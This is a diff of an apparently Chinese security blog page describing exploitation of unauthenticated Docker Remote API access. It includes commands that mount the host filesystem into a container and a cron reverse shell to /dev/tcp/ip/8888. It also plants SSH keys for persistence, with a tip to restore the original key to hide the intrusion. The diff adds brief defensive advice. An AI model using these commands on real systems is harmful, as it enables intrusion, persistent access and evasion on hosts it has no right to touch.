@@ -244,7 +244,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/docker.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -395,14 +395,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    761
+                    821
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -441,8 +441,7 @@
 <p>将宿主机的根目录挂载到镜像id为c059bfaa849c的/mnt目录下</p>
 <p><code>docker -H tcp://靶机:2375 run -it -v /:/mnt 镜像id sh</code></p>
 <p><img src="https://s2.loli.net/2021/12/08/QLwq3DyY5GBUgsX.png" alt="image-20211207160516702"></p>
-<p>直接反弹shell&amp;定时任务反弹shell</p>
-<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
+<h5 id="直接反弹shell-amp-定时任务反弹shell"><a href="#直接反弹shell-amp-定时任务反弹shell" class="headerlink" title="直接反弹shell&amp;定时任务反弹shell"></a>直接反弹shell&amp;定时任务反弹shell</h5><p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
 <p><img src="https://s2.loli.net/2021/12/08/F6MD29f7tgGAvPp.png" alt="image-20211207164406870"></p>
 <p>已经确认防火墙关闭并且端口开放，但是仍然反弹不了</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1 </code></p>
@@ -468,6 +467,7 @@
 </blockquote>
 <p>直接rce的payload</p>
 <p><code>docker -H ip:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</code></p>
+<p>未成功</p>
 <h4 id="公私钥提权"><a href="#公私钥提权" class="headerlink" title="公私钥提权"></a>公私钥提权</h4><p>攻击者生成一对公私钥</p>
 <p><code> ssh-keygen -t rsa</code></p>
 <p>输入密钥名和密码</p>
@@ -478,7 +478,11 @@
 <p><code>ssh -i 私钥文件 root@公钥文件所在ip</code></p>
 <p>ps:</p>
 <p>这里可以先保存下对方原来的公钥，等利用公私钥登录权限维持后再给对方换回去，以隐匿操作</p>
-<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
+<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><ul>
+<li>禁止外网访问或是设置白名单</li>
+<li>在内网中也要设置严格的访问规则，使用TLS认证</li>
+</ul>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
 <li>docker中进入的容器有一部分使用的是sh的shell</li>
 <li>反弹shell先要在vps上开启监听</li>
 <li>挂载之后也没有找到root/.ssh目录下的公钥文件</li>
@@ -491,6 +495,8 @@
 <li>可能不是使用的bash、而是sh或其他</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/107761955">Docker未授权访问漏洞</a></p>
 
                 
             </div>
@@ -610,8 +616,7 @@
                 <a href="/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="docker remote api未授权访问">
+                        <img src="/images/docker.png" class="responsive-img" alt="docker remote api未授权访问">
                         
                         <span class="card-title">docker remote api未授权访问</span>
                     </div>
@@ -656,8 +661,7 @@
                 <a href="/2021/12/07/docker%E9%80%83%E9%80%B8/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="docker逃逸">
+                        <img src="/images/docker.png" class="responsive-img" alt="docker逃逸">
                         
                         <span class="card-title">docker逃逸</span>
                     </div>
@@ -887,7 +891,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">39.4k</span>&nbsp;字
+                class="white-color">39.5k</span>&nbsp;字
             
             
             
